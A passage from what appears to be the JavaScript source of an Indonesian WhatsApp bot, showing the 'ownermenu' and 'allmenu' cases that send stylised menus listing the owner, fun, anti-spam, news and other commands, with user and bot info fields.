   ◦ ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ
   ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ
   ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴᴀᴍᴀ
   ◦ ᴀʀᴛɪɴᴀᴍᴀ
   ◦ ʀᴀᴍᴀʟᴀɴᴊᴏᴅᴏʜ
   ◦ ᴀʀᴛɪᴍɪᴍᴘɪ
   ◦ ᴇᴍᴏᴊɪᴍɪx2
   ◦ ᴇᴍᴏᴊɪᴍɪx
   ◦ ᴄᴏᴜᴘʟᴇ
   ◦ ᴀᴘᴀᴋᴀʜ
   ◦ ᴀꜰᴋ
   ◦ ᴄᴇᴋᴋʜᴏᴅᴀᴍ
   ◦ ᴄᴇᴋᴋʜᴏᴅᴀᴍ2
   ◦ ᴠɪᴅɢᴀʟᴀᴜ
   ◦ ɢᴀᴄʜᴀ-ᴍᴇᴍʙᴇʀ (ᴊᴋᴛ48)
   ◦ ᴛxᴛ2ɪᴍɢ (prompt)`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case 'ownermenu': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isRegistered) return reply('Kamu belum daftar, silahkan ketik .daftar');
    let Menu_Rulz = `
┈─────────┈⫺
*メ O W N E R M E N U メ*
┈─────────┈⫺
   ◦ ᴀᴅᴅᴘʀᴇᴍ
   ◦ ᴅᴇʟᴘʀᴇᴍ
   ◦ ʙᴄɢᴄ
   ◦ ɪᴘʙᴏᴛ
   ◦ ʟᴇᴀᴠᴇɢᴄ
   ◦ ꜱᴇᴛʙɪᴏʙᴏᴛ
   ◦ ᴅᴇʟᴇᴛᴇᴘᴘʙᴏᴛ
   ◦ ᴅᴇʟᴄʜᴀᴛ
   ◦ ᴅᴇʟ
   ◦ ɪɴᴠɪᴛᴇ
   ◦ ʙᴄɪᴍɢ
   ◦ ʀᴇꜱᴛᴀʀᴛ
   ◦ ᴅᴇʟᴄᴀꜱᴇ
   ◦ ꜱᴇʟꜰ
   ◦ addlimit
   ◦ resetlimit
   ◦ ᴀᴅᴅᴄᴀꜱᴇ
   ◦ ᴘᴜʙʟɪᴄ
   ◦ ᴀᴜᴛᴏʀᴇᴀᴅ
   ◦ ᴀᴜᴛᴏʙɪᴏ
   ◦ ɢᴇᴛᴄᴀꜱᴇ
   ◦ ʀᴇᴀᴅᴄʜᴀɴɢᴇ
   ◦ ʙɪᴏᴄʜᴀɴɢᴇ
   ◦ ꜱᴇᴛᴘᴘʙᴏᴛ
   ◦ ᴜɴʙʟᴏᴄᴋ
   ◦ ʙʟᴏᴄᴋ
   ◦ ᴄʀᴇᴀᴛᴇɢᴄ
   ◦ ʟɪꜱᴛᴘᴄ
   ◦ ᴊᴏɪɴ
   ◦ addgc
   ◦ delgc
   ◦ clearall
   ◦ ᴀᴅᴅᴏᴡɴᴇʀ
   ◦ ʙʟᴀᴄᴋʟɪꜱᴛ`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "allmenu": case "all": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let limitz = db.data.users[m.sender].limit;
menuu = `ʜᴇʟʟᴏ, ɪ'ᴍ ᴀ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ ᴄʀᴇᴀᴛᴇᴅ ʙʏ ꜰɪɴꜱɪɪ. ɪ'ᴍ ɴᴏᴛ ʀᴇᴀʟ ʙᴜᴛ ᴀ ᴠɪʀᴛᴜᴀʟ ᴀᴜᴛᴏᴍᴀᴛɪᴄ ꜱʏꜱᴛᴇᴍ

ᴜꜱᴇʀꜱ ᴡʜᴏ ʜᴀᴠᴇ ɴᴏᴛ ʏᴇᴛ ʀᴇɢɪꜱᴛᴇʀᴇᴅ ᴀʀᴇ ᴇxᴘᴇᴄᴛᴇᴅ ᴛᴏ ʀᴇɢɪꜱᴛᴇʀ ᴛʜᴇᴍꜱᴇʟᴠᴇꜱ ᴀꜱ ʙᴏᴛ ᴜꜱᴇʀꜱ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ʙᴏᴛ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴀʙʟᴇ ᴛᴏ ᴀᴄᴄᴇꜱꜱ ʏᴏᴜ

> ＩＮＦＯ ＵＳＥＲ
乂 ɴᴏᴍᴏʀ : @${m?.sender.split('@')[0]}
乂 ɴᴀᴍᴀ : ${pushname}
乂 ʟɪᴍɪᴛ : ${limitz}
乂 ꜱᴛᴀᴛᴜꜱᴜꜱᴇʀ : ${isCreator ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ꜰʀᴇᴇ'}
乂 ᴛᴇʀᴅᴀꜰᴛᴀʀ : ʏᴇꜱ
乂 ꜱᴀʟᴅᴏ : Rp ${toRupiah(cekSaldo(sender, db_saldo))}

> ＩＮＦＯ ＢＯＴ
乂 ʙᴏᴛ ɴᴀᴍᴇ : ${global.botname}
乂 ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ${global.ownername}
乂 ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}
乂 ɴᴏ ᴏᴡɴᴇʀ : 62895392968503
乂 ᴠᴇʀꜱɪᴏɴ : 11.8.0
乂 ᴛᴏᴛᴀʟ ꜰɪᴛᴜʀ : ${totalFitur()}  ꜰɪᴛᴜʀ

ɪꜰ ᴛʜᴇʀᴇ ɪꜱ ᴀɴ ᴇʀʀᴏʀ ɪɴ ᴛʜᴇ ꜰɪɴꜱɪɪ ᴀɪ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ ꜰᴇᴀᴛᴜʀᴇ, ʀᴇᴘᴏʀᴛ ɪᴛ ᴛᴏ ꜰɪɴꜱɪɪ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ ꜱᴏ ᴛʜᴀᴛ ꜰɪɴꜱɪɪ ᴄᴀɴ ꜰɪx ɪᴛ
‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
┈─────────────────┈⫺
*メ O W N E R M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴀᴅᴅᴘʀᴇᴍ
     ヤ ◦ ᴀᴅᴅᴘʀᴇᴍ
     ヤ ◦ ᴅᴇʟᴘʀᴇᴍ
     ヤ ◦ ʙᴄɢᴄ
     ヤ ◦ ɪᴘʙᴏᴛ
     ヤ ◦ ʟᴇᴀᴠᴇɢᴄ
     ヤ ◦ ꜱᴇᴛʙɪᴏʙᴏᴛ
     ヤ ◦ ᴅᴇʟᴇᴛᴇᴘᴘʙᴏᴛ
     ヤ ◦ ᴅᴇʟᴄʜᴀᴛ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ɪɴᴠɪᴛᴇ
     ヤ ◦ ʙᴄɪᴍɢ
     ヤ ◦ ʀᴇꜱᴛᴀʀᴛ
     ヤ ◦ ᴅᴇʟᴄᴀꜱᴇ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ꜱᴇʟꜰ
     ヤ ◦ addlimit
     ヤ ◦ resetlimit
     ヤ ◦ ᴅᴇʟᴄᴀꜱᴇ
     ヤ ◦ ᴀᴅᴅᴄᴀꜱᴇ
     ヤ ◦ ᴘᴜʙʟɪᴄ
     ヤ ◦ ᴀᴜᴛᴏʀᴇᴀᴅ
     ヤ ◦ ᴀᴜᴛᴏʙɪᴏ
     ヤ ◦ ɢᴇᴛᴄᴀꜱᴇ
     ヤ ◦ ʀᴇᴀᴅᴄʜᴀɴɢᴇ
     ヤ ◦ ʙɪᴏᴄʜᴀɴɢᴇ
     ヤ ◦ ꜱᴇᴛᴘᴘʙᴏᴛ
     ヤ ◦ ᴜɴʙʟᴄᴏᴋ
     ヤ ◦ ʙʟᴏᴄᴋ
     ヤ ◦ ᴄʀᴇᴀᴛᴇɢᴄ
     ヤ ◦ ʟɪꜱᴛᴘᴄ
     ヤ ◦ ᴊᴏɪɴ
     ヤ ◦ addgc
     ヤ ◦ delgc
     ヤ ◦ ᴄʟᴇᴀʀᴀʟʟ
     ヤ ◦ ᴀᴅᴅᴏᴡɴᴇʀ
     ヤ ◦ ʙʟᴀᴄᴋʟɪsᴛ

┈─────────────────┈⫺
*メ F U N M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴄᴀɴᴛɪᴋᴄᴇᴋ
     ヤ ◦ ᴡᴀɴɢʏ
     ヤ ◦ ᴋᴀᴘᴀɴᴋᴀʜ
     ヤ ◦ ʀᴀᴛᴇ
     ヤ ◦ ᴊᴏᴍᴏᴋᴄᴇᴋ
     ヤ ◦ ɢᴀɴᴛᴇɴɢᴄᴇᴋ
     ヤ ◦ ᴄᴇᴋᴀꜱᴀʟᴍᴇᴍʙᴇʀ
     ヤ ◦ ǫᴄ
     ヤ ◦ ǫᴄ2
     ヤ ◦ ᴛᴛꜱ
     ヤ ◦ ᴛɪᴋᴛᴏᴋꜱᴛᴀʟᴋ
     ヤ ◦ ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
     ヤ ◦ ᴜᴘꜱᴡ
     ヤ ◦ ɢᴇᴛꜱᴡ
     ヤ ◦ ʟɪꜱᴛꜱᴡ
     ヤ ◦ ᴛᴏᴛᴀʟꜰɪᴛᴜʀᴇ
     ヤ ◦ ꜰᴇɴɢꜱʜᴜɪ
     ヤ ◦ ᴀʀᴛɪᴛᴀʀᴏᴛ
     ヤ ◦ ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ
     ヤ ◦ ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ
     ヤ ◦ ᴘᴇᴋᴇʀᴊᴀᴀɴ
     ヤ ◦ ʀᴇᴊᴇᴋɪ
     ヤ ◦ ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ
     ヤ ◦ ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ
     ヤ ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ
     ヤ ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴᴀᴍᴀ
     ヤ ◦ ᴀʀᴛɪɴᴀᴍᴀ
     ヤ ◦ ʀᴀᴍᴀʟᴀɴᴊᴏᴅᴏʜ
     ヤ ◦ ᴀʀᴛɪᴍɪᴍᴘɪ
     ヤ ◦ ᴇᴍᴏᴊɪᴍɪx2
     ヤ ◦ ᴇᴍᴏᴊɪᴍɪx
     ヤ ◦ ᴄᴏᴜᴘʟᴇ
     ヤ ◦ ᴀᴘᴀᴋᴀʜ
     ヤ ◦ ᴀꜰᴋ
     ヤ ◦ ᴄᴇᴋᴋʜᴏᴅᴀᴍ
     ヤ ◦ ᴄᴇᴋᴋʜᴏᴅᴀᴍ2
     ヤ ◦ ᴠɪᴅɢᴀʟᴀᴜ
     ヤ ◦ ɢᴀᴄʜᴀ-ᴍᴇᴍʙᴇʀ (ᴊᴋᴛ48)
     ヤ ◦ ᴛxᴛ2ɪᴍɢ (prompt)

┈─────────────────┈⫺
*メ A N T I M E N U メ*   
┈─────────────────┈⫺
     ヤ ◦ ᴀɴᴛɪʙᴏᴛ
     ヤ ◦ ᴀɴᴛɪᴡᴀᴍᴇ
     ヤ ◦ ᴀɴᴛɪᴀꜱɪɴɢ
     ヤ ◦ ᴀɴᴛɪᴠɪʀᴛᴇx
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋᴀʟʟ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋꜰʙ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋʏᴛ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋʏᴛᴄʜ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋɪɢ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋᴛᴇʟᴇ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋᴛɪᴋᴛᴏᴋ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋᴛᴡɪᴛᴛᴇʀ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋ
     ヤ ◦ ᴀɴᴛɪᴍᴇᴅɪᴀ

┈─────────────────┈⫺
*メ B E R I T A M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ꜰᴀᴊᴀʀ
     ヤ ◦ ᴄɴɴ
     ヤ ◦ ʟᴀʏᴀʀᴋᴀᴄᴀ
     ヤ ◦ ᴄɴʙᴄ
     ヤ ◦ ᴛʀɪʙᴜɴ
     ヤ ◦ ɪɴᴅᴏᴢᴏɴᴇ
     ヤ ◦ ᴋᴏᴍᴘᴀꜱ
     ヤ ◦ ᴅᴇᴛɪᴋ
     ヤ ◦ ᴅᴀɪʟʏ
     ヤ ◦ ɪɴᴇᴡꜱ
     ヤ ◦ ᴏᴋᴇᴢᴏɴᴇ
     ヤ ◦ ꜱɪɴᴅᴏ
     ヤ ◦ ᴛᴇᴍᴘᴏ
     ヤ ◦ ᴀɴᴛᴀʀᴀ
     ヤ ◦ ᴋᴏɴᴛᴀɴ
     ヤ ◦ ᴍᴇʀᴅᴇᴋᴀ
     ヤ ◦ ᴊᴀʟᴀɴᴛɪᴋᴜꜱ-ᴍᴇᴍᴇ
     ヤ ◦ ɢᴇᴍᴘᴀ
     ヤ ◦ ɢᴇᴍᴘᴀ
     ヤ ◦ ᴀꜰᴋ

┈─────────────────┈⫺
*メ O T H E R M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴏᴡɴᴇʀ
     ヤ ◦ ʟɪꜱᴛᴘʀᴇᴍ
     ヤ ◦ ʀᴜɴᴛɪᴍᴇ
     ヤ ◦ ᴛᴏᴛᴀʟꜰɪᴛᴜʀᴇ
